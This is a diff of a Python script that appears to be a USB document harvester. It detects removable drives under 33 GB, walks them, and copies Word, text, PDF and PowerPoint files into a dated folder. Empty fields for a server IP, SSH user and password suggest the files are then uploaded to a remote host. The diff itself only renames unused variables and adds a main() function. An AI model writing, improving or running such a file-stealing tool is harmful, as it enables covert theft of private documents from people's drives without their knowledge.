@@ -31,7 +31,7 @@ def getremovabledisk():
     for i in range(25):
         if (sign & 1 << i):
             if win32file.GetDriveType(drive_all[i]) == 2:
-                free_bytes, total_bytes, total_free_bytes = win32file.GetDiskFreeSpaceEx(drive_all[i])
+                _, total_bytes, _ = win32file.GetDiskFreeSpaceEx(drive_all[i])
                 if (total_bytes / 1024 / 1024 / 1024) < 33:
                     drives.append(drive_all[i])
     return drives
@@ -45,7 +45,7 @@ def copyfile(drives, target_dir):
     if not os.path.exists(today):
         os.makedirs(today)
     for udisk in drives:
-        for root, dirs, files in os.walk(udisk):
+        for root, _, files in os.walk(udisk):
             for one in files:
                 type = os.path.splitext(one)[1]
                 if type == ".doc" or type == ".docx" or type == ".txt" or type == ".pdf" or type == ".pptx" or type == ".ppt":
@@ -54,7 +54,7 @@ def copyfile(drives, target_dir):
                     shutil.copy(root + '/' + one, today + root[3:] + '/' + one)
 
 
-if __name__ == '__main__':
+def main():
     host = ""  # Your server IP
     user = ""  # Your ssh user/name
     pwd = ""  # Your password
@@ -71,3 +71,7 @@ if __name__ == '__main__':
         if (drives != drives_bk) & (len(drives_bk) > len(drives)):
             # Disk remove
             drives_bk = drives
+    pass
+
+if __name__ == '__main__':
+    main()
